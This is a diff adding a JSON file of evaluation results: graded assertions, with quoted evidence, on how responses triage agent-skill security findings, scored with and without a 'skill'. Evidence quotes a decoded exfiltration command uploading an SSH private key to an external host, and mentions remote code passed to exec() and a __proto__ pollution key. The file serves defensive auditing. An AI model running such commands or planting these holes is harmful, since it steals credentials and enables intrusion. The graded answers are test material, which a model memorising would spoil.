+            "The response explains that the validator’s warning is based on basename‑only matching for deny_write, while write evaluation uses exact path matching."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response discusses path specificity but never mentions basename versus exact‑path matching."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-case-3",
+        "assertion_index": 3,
+        "text": "The response states the precedence rule being applied, including that deny_write resolution is most-specific-wins rather than first-match.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It states that `deny_write` always wins over `write` with most‑specific‑wins precedence, not first‑match."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response says deny_write takes precedence but does not state the most‑specific‑wins rule or contrast it with first‑match."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-control-case-1",
+        "assertion_index": 0,
+        "text": "The response refuses all three claims in the drafted line rather than only the weakest one.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "No, the supplier‑review line you have drafted … is not supportable … each clause … misrepresents what was actually checked."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response says the drafted line is supportable, not that it refuses any of the three claims."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-control-case-1",
+        "assertion_index": 1,
+        "text": "The response explains that the reported signature state is a check on the field's shape and that the validator never verifies the signature, and says to call the verification explicitly so that unverifiable cannot be recorded as verified.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "`OK (signature=signed, …)` only confirms the field has the correct shape … `validate_manifest` never calls `verify_signature` … you must call signature verification explicitly."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never mentions the signature field's shape, that the validator never verifies the signature, or to call verify_signature explicitly."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-control-case-1",
+        "assertion_index": 2,
+        "text": "The response states that a present or matching content hash covers only the hashed surface — SKILL.md and the Python scripts — so files outside it can be rewritten with the hash unmoved.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "`hash=present` … does not mean the hash covers the package … hashed surface defined by SURFACE_GLOBS explicitly excludes `skill.usf.yaml` … a porting tool could modify those without affecting the hash."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not state that a present/matching hash only covers SKILL.md and scripts or that files outside can be rewritten."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-control-case-1",
+        "assertion_index": 3,
+        "text": "The response says the port markers are warnings that a default run's exit code discards, and directs the reviewer to run the validator in strict mode.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "critical porting signals are warnings, not errors … the validator’s ok flag ignores them … Run the validator in **strict mode**: `python3 validators/usf.py --strict skill.usf.yaml`."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention port markers being warnings, exit‑code discarding, or advise running the validator in strict mode."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-regression-case-1",
+        "assertion_index": 0,
+        "text": "The response reads the escape run in scripts/report.py and reports the finding, naming both what it decodes to — a command uploading the caller's SSH private key to an external host — and the path from the decoded literal into os.system.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The decoded command is:\n```bash\ncurl -T ~/.ssh/id_rsa h.io\n``` ... and the response describes the path: decode → assign to `_STAGE` → later pass to `codecs.decode` in `publish()` → `os.system`."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not show or read the actual hex‑escaped string; it only describes the decoded payload."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-case-1",
+        "assertion_index": 0,
+        "text": "The response names exactly one primary or origin category and it is AST03.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "File this under **AST03 — Over-Privileged Skills** as the origin. ... Final record: - `ast_id: AST03`"
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response says to file under AST08, not AST03."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-case-1",
+        "assertion_index": 1,
+        "text": "The response records AST08 as a contributing control failure rather than as a second primary or a co-equal category.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Contributing failure: The scanner didn’t flag it — that’s **AST08**, but only as a *catcher*, not the *preventer*."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "It treats AST08 as the primary category, not a contributing control failure."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-case-1",
+        "assertion_index": 2,
+        "text": "The response attaches both an owner and an action to the contributing entry.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Contributing: `AST08` (owned by scanner operator; action: improve detection coverage)"
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "No owner or action is mentioned for any entry."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-case-1",
+        "assertion_index": 3,
+        "text": "The response justifies the origin with a prevent-versus-catch distinction rather than by matching keywords in the finding's wording.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The scanner didn’t flag it — that’s **AST08**, but only as a *catcher*, not the *preventer*; the grant is the preventable condition (AST03)."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Justification is based on access‑control wording, not a prevent‑versus‑catch distinction."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-case-2",
+        "assertion_index": 0,
+        "text": "The response names exactly one origin category and it is AST09.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "\"**Origin:** AST09\""
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response lists Origin AST ID: AST-94872, not AST09."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-case-2",
+        "assertion_index": 1,
+        "text": "The response justifies AST09 as missing installation control rather than missing version control, for example by noting there is no approved baseline for the install to have drifted from.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "\"skill was never baseline-approved or recorded, meaning there was never a governance position...\""
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention missing installation control, version control, or an approved baseline for AST09."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-case-2",
+        "assertion_index": 2,
+        "text": "The response states that AST09 ships no detector and that no scan of the package can confirm this finding.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "\"AST09 has **no detectable scenarios at the package level**... No static or dynamic analysis... can confirm...\""
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response makes no statement about AST09 shipping no detector or scans being unable to confirm."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-case-3",
+        "assertion_index": 0,
+        "text": "The response declines to produce a routing verdict for a package and gives the reason: triage routes findings expressed in prose and does not scan or open packages.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Routing applies only when a finding in prose … advisory skill does not process packages directly; it routes claims about them. No advisory routing is needed."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response states the package belongs to AST10‑S06, providing a routing verdict rather than declining."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-case-3",
+        "assertion_index": 1,
+        "text": "The response redirects the user to a concrete alternative, such as the relevant category skill's own entry point or the repository's audit path.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "go straight to the relevant AST category's skill file … consult `skills/AST10/SKILL.md`."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response gives no alternative entry point; it simply says open the ticket in the AST10‑S06 queue."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-control-case-1",
+        "assertion_index": 0,
+        "text": "The response gives AST02 as the single origin and records AST07 as a contributing control failure carrying its own owner and action, rather than as a second primary.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "**ast_id**: AST02 ... Contributing control failures: - **AST07** — Missing Update Verification **Owner**: The team operating the agent host ... **Action**: Introduce manual review..."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response gives Origin AST ID: AST-2023-9847 and no mention of AST02 or AST07."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-regression-case-1",
+        "assertion_index": 0,
+        "text": "The response declines to assign any AST01-AST10 origin id to this finding and states that a null routing result is the correct output here rather than a closest-fitting category.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "`ast_id: null` — This finding is out of scope for AST01-AST10."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response is only 'AST03' – it assigns an AST id and never mentions a null routing result."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-regression-case-1",
+        "assertion_index": 1,
+        "text": "The response gives the reason as a scope boundary — these categories apply to the agent-skill form specifically and an MCP server is outside it — rather than as insufficient detail about the finding.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "AST01‑AST10 categories apply specifically to *skills* … a server‑side tool … is not a skill; it is a server …"
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response gives no reason at all; it only contains 'AST03'."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-regression-case-1",
+        "assertion_index": 2,
+        "text": "The response does not record AST03, or any other AST category, as a contributing control failure for this finding.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Routing this to AST03 (or any AST category) would misattribute the root cause …"
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response records AST03, directly violating the claim of not recording any AST category."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-regression-case-1",
+        "assertion_index": 3,
+        "text": "The response redirects the reporter to where the finding does belong — the MCP server's own owners, and the MCP-specific top-ten list — rather than returning a bare refusal.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "This finding falls under the **MCP Top 10**, ... owned by the team operating the MCP server."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not redirect the reporter; it merely outputs 'AST03' with no guidance."
+          ]
+        }
+      }
+    ],
+    "failed_with_passed_without": [
+      {
+        "eval_slug": "AST04-case-3",
+        "assertion_index": 0,
+        "text": "The output states that an egress primitive such as curl, and a declared shell: true, are capabilities rather than AST04 findings — AST04 is keyed on a contradiction between what the manifest declares and what the code reaches — and does not treat the presence of either as a finding.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not explicitly state that the presence of curl or shell:true are merely capabilities and not AST04 findings; it only notes no contradiction."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The use of `shell: true` is consistent ... Both `curl` calls target `api.weather.example`, which is explicitly permitted... AST04 does not block the approval."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST04-case-3",
+        "assertion_index": 2,
+        "text": "If the output raises the breadth of the declared `shell: true` at all, it attributes that to AST03 over-privilege rather than to AST04 misdeclaration.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never attributes the declared shell:true breadth to AST03 over‑privilege; it simply says it is consistent with the risk tier."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The response says `shell: true` is consistent with the declared permissions and does not raise its breadth."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-case-1",
+        "assertion_index": 3,
+        "text": "The response states the general rule that the presence of a carrier — an archive, a symlink, an external URL, a credential reference — is not by itself a conviction.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not state a general rule that the mere presence of a carrier is not by itself a conviction."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The presence of an archive and a symlink is described as 'not inherently malicious', i.e., not a conviction on its own."
+          ]
+        }
+      }
+    ],
+    "passed_in_both": [
+      {
+        "eval_slug": "AST01-case-1",
+        "assertion_index": 1,
+        "text": "The response states that an egress construct on its own is not a finding — that a finding here requires the construct plus a contradiction of the package's own declaration.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "AST01 does not flag all egress — it flags undisclosed or contradictory egress... a finding requires a contradiction."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It says \"while it looks like data exfiltration, it's actually authorized and disclosed in the manifest\" and notes the declared destination matches, implying no finding without a contradiction."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST01-regression-case-1",
+        "assertion_index": 3,
+        "text": "The response explains why reading an agent identity artifact warrants elevated review in its own right — it exposes the agent's behavioural identity for cloning, replay or impersonation, not only its credentials.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It states “Reading SOUL.md allows behavioral cloning and impersonation, which is more damaging than mere credential theft,” explaining why reading the identity artifact warrants elevated review."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The response explains that reading SOUL.md exposes the agent’s identity for cloning and impersonation, not just credentials."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST02-case-1",
+        "assertion_index": 0,
+        "text": "The response names the two variables the env block actually sets (EDITOR and PAGER) and states the discriminator as a rule rather than as an observation about these two variables: the finding is an override of a control-plane variable — one that steers where the agent sends traffic or what it loads — and a variable that steers neither is not one.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The variables it sets — `EDITOR` and `PAGER` — are ...; only when it carries variables that alter agent telemetry, authentication, or traffic routing does it become a confirmed `AST02-S03` finding."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The response mentions `EDITOR` and `PAGER` and says they are benign and do not influence the control plane, i.e., they are not control‑plane overrides."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST02-control-case-1",
+        "assertion_index": 0,
+        "text": "The response calls this a finding and names the execution path precisely — the shipped .vscode/tasks.json and the folder-open run trigger on the task — rather than resting on the command string.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "This is a confirmed finding... The presence of \"runOn\": \"folderOpen\" paired with a shell command in .vscode/tasks.json creates an unprompted execution path."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "You're correct to flag this as a finding. ... The presence of a `runOn: \"folderOpen\"` task ... .vscode/tasks.json ..."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-case-1",
+        "assertion_index": 0,
+        "text": "The response names notes/session.md as the only declared write target and states that SOUL.md, MEMORY.md and AGENTS.md are all listed in deny_write.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "requests write access, but only to `notes/session.md`, and explicitly denies writing to ... `SOUL.md`, `MEMORY.md`, and `AGENTS.md`."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The skill requests write access, but only to `notes/session.md`, and explicitly denies writing to ... (`SOUL.md`, `MEMORY.md`, `AGENTS.md`) via `deny_write`."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-case-1",
+        "assertion_index": 1,
+        "text": "The response states that the presence of a write scope is not the finding — that what matters is whether the write reaches an agent identity file.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "the concern is not write access in general, but unblocked write access to those specific identity files."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "This is a clean fixture designed to test whether detectors wrongly flag any write permission as risky, regardless of context… Since it avoids granting write access to identity files — the core issue … this behavior is safe."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-regression-case-1",
+        "assertion_index": 0,
+        "text": "The response declines to close the finding on the strength of the green package scan.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "No, you cannot close the AST03 finding based on the green package scan."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "No, you cannot close the AST03 finding based solely on the green package scan and honest manifest declaration."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST04-case-1",
+        "assertion_index": 0,
+        "text": "The output states that remediating only one of the two halves leaves the other defect in place, i.e. it counts at least two required changes.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "These are **two separate and necessary fixes** — **neither one alone is sufficient**. ... Fixing only the loader leaves a risky code path ... Fixing only the payload leaves the door open."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "You need to make **two separate, essential changes**... Both are required for full remediation."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST04-control-case-1",
+        "assertion_index": 0,
+        "text": "The response confirms a finding and names both halves of it — the polluting key in the shipped manifest.json and the recursive merge in scripts/merge.js that assigns onto the target.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The response states: \"The vulnerability arises from two components working together: ... The `manifest.json` contains a property \"__proto__\" ... The bundled `scripts/merge.js` performs a recursive merge ...\""
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The answer says \"issue lies in the unsafe recursive merge operation in `scripts/merge.js`\" and gives an example manifest entry \"`\"__proto__\": { \"isAdmin\": true }`\" showing the polluting key in the shipped manifest.json."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST04-control-case-1",
+        "assertion_index": 1,
+        "text": "The response rejects pinning a safe loader as the fix and explains that JSON parsing executes nothing and creates only an own property, so the exploitable step is the later unsafe merge rather than the parse.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It says: \"❌ **Pinning `SafeLoader` does nothing here**: ... `JSON.parse()` is safe; the `deepMerge()` function is not.\""
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It states \"You should not ask for pinning a parser here... This is not a JSON parsing bug—`JSON.parse` itself does not execute code... the problem arises after parsing, during the merging logic.\""
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST04-control-case-1",
+        "assertion_index": 2,
+        "text": "The response states the fix in terms of the merge — refusing or skipping the polluting key names, or merging onto a target that cannot inherit — rather than as a parser, loader or schema change.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It advises: \"Reject or rename dangerous keys like `__proto__`, `constructor`, and `prototype` before merging...\" and provides a safeMerge example."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The fix is described as sanitizing keys: \"Reject or skip keys like `\"__proto__\"`, `\"prototype\"`, `\"constructor\"` during traversal\" and provides a safe `deepMerge` implementation, avoiding parser/loader changes."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-case-3",
+        "assertion_index": 1,
+        "text": "The output states that a code-level or dataflow scan cannot discriminate this pair, so the scanner's pass is not evidence that either package is clean.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "\"the dataflow scanner — which passed both fixtures—... it is blind to instruction-boundary violations... the scanner’s pass is not evidence that the skill is safe\""
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Response says the dataflow scanner passes both fixtures, indicating a limitation and that the scanner's pass is not evidence that either package is clean."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-control-case-1",
+        "assertion_index": 0,
+        "text": "The response states the finding in the package's own terms — the fetched response body is passed to exec() in the caller's namespace, so the remote host chooses what code runs with the agent's permissions.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "fetches Python code ... directly passes the response body to `exec()`, so the remote host chooses what code runs with the agent's permissions."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "directly executes the response body using `exec()`, enabling arbitrary code execution controlled by the remote server."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST07-case-1",
+        "assertion_index": 4,
+        "text": "The response does not tell the user the ticket can be closed on the strength of the pin.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Response makes no statement about closing the ticket on the pin."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Response gives a CLEAN verdict but does not tell the user the ticket can be closed based on the pin."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-case-2",
+        "assertion_index": 0,
+        "text": "The response states the separating predicate as a detection rule matching a view the raw bytes concealed — content recovered by normalization or decoding that is not already present in the raw bytes — and explicitly rules out the mere presence of an encoded blob as the trigger.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "carrier presence alone is not sufficient... decoded text contains content that matches any detection rule when re‑scanned"
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "A base64-encoded string is present ... decoded twice ... the final decoded content is not itself a valid image or binary format."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST08-regression-case-1",
+        "assertion_index": 1,
+        "text": "The response states that source review is not evidence about what executes, because the import machinery can select a cached bytecode file whose behaviour the corresponding source never shows.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "\"You cannot rely on source review when bytecode caches are present and unvalidated.\" and \"The source file (util.py) is irrelevant at runtime — the bytecode is what executes.\""
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Response says \"You cannot assess the security of this package by reviewing only the `.py` files\" and notes the cache skips source validation, indicating source review is not evidence of what executes."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-case-3",
+        "assertion_index": 1,
+        "text": "The response recommends a verification step that resolves whether a write to SOUL.md is allowed under most-specific-wins precedence — evaluating the write decision for that exact path — rather than testing whether some write entry overlaps some deny_write entry, and it does not rest the answer on the validator's warning text.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It recommends evaluating `write_allowed(manifest, \"SOUL.md\")` directly and warns not to rely on the validator’s warning text."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It advises checking actual path resolution and testing writes to both SOUL.md and config/SOUL.md, and explicitly says not to rely on the validator’s warning."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST10-case-3",
+        "assertion_index": 2,
+        "text": "The response gives a concrete manifest edit that makes the deny_write entry cover the path actually granted.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It suggests fixing the manifest by adding `SOUL.md` explicitly to `deny_write` (or removing it from write)."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It suggests broadening deny_write to \"**/SOUL.md\" (or restricting write) as a concrete manifest edit."
+          ]
+        }
+      },
+      {
+        "eval_slug": "advisory-case-3",
+        "assertion_index": 2,
+        "text": "The response does not assert that the package is malicious, vulnerable, or a confirmed finding in any AST category.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The response never calls the package malicious, vulnerable, or a confirmed finding."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It describes the fixture as a clean (non‑malicious) test case and does not call it malicious or vulnerable."
+          ]
+        }
+      }
+    ],
+    "failed_in_both": [
+      {
+        "eval_slug": "AST01-case-1",
+        "assertion_index": 3,
+        "text": "The response advises against blocking, quarantining or rejecting the package on the basis of the requests.post call, and at the same time declines to endorse the package as clean overall.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not explicitly advise against blocking, quarantining, or rejecting the package; it only states no AST01 finding."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response calls the package \"clean\" and does not advise against blocking, quarantining, or rejecting; it endorses the package as clean overall."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST01-case-2",
+        "assertion_index": 0,
+        "text": "The response states that the finding is the contradiction between the script's destination and the manifest's declaration, and that neither half on its own — an outbound HTTP call, or a host missing from the allowlist — is a finding.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not state that neither half on its own (outbound call or missing allowlist entry) is a finding; it only describes the contradiction as the finding."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response says the script exfiltrates data to a host not declared in the manifest, which violates the permissions, and does not claim that an outbound call or a missing allowlist entry alone is not a finding."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST01-case-2",
+        "assertion_index": 1,
+        "text": "The response states that the package cannot settle which of the two remediation directions is correct — adding the destination to the declared allowlist, or removing it from the code — because whether that destination is a legitimate one is a fact about the deployment rather than about the package's bytes.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not say the package cannot decide which remediation direction is correct nor that legitimacy is a deployment fact; it presents both options as viable."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response presents both remediation options but does not state the package cannot decide which is correct or that legitimacy is a deployment‑only fact."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST01-case-3",
+        "assertion_index": 1,
+        "text": "The response identifies the reported behaviour as AST01-S07 Cognitive Degradation and Agent Drift, by scenario id or by title.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response describes behavior as runtime accumulation but never mentions AST01‑S07 or the title Cognitive Degradation and Agent Drift."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not mention AST01-S07, Cognitive Degradation, or Agent Drift."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST01-case-3",
+        "assertion_index": 4,
+        "text": "The response states that no shipped AST01 static check covers climbing retry counts or context growth, and does not attribute the reported degradation to any such check.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not explicitly state that no shipped AST01 static check covers climbing retry counts or context growth."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not discuss whether any AST01 static check covers retry counts or context growth."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST01-control-case-1",
+        "assertion_index": 0,
+        "text": "The response declines to add this detection to AST01's count and states that no AST01 scenario id can be supplied for it.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response says \"Do not add to the AST01 detection count\" but does not explicitly state that no AST01 scenario id can be supplied."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Therefore, add 1 to the AST01 detection count for the quarter, with AST08-S02 listed as the associated scenario ID."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST01-control-case-1",
+        "assertion_index": 2,
+        "text": "The response treats the reattribution as a change of owner rather than a dismissal — it reads the encoded literal, says what the decoded payload actually does, and states that it must still be escalated.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response contains no discussion of the encoded literal, decoded payload actions, or escalation."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not read the encoded literal, describe what the payload does, or say it must be escalated."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST01-control-case-1",
+        "assertion_index": 3,
+        "text": "The response says the rest of AST01 is unestablished rather than clean for this package, and gives a reason drawn from the package itself, such as the destination host existing only inside the encoded blob so the egress checks have no literal host to compare against the declared allowlist.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not mention the rest of AST01 being unestablished or give any reason about destination host inside encoded blob."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not say the rest of AST01 is unestablished nor give a reason about a destination host inside the encoded blob."
+          ]
+        }
+      },
+      {
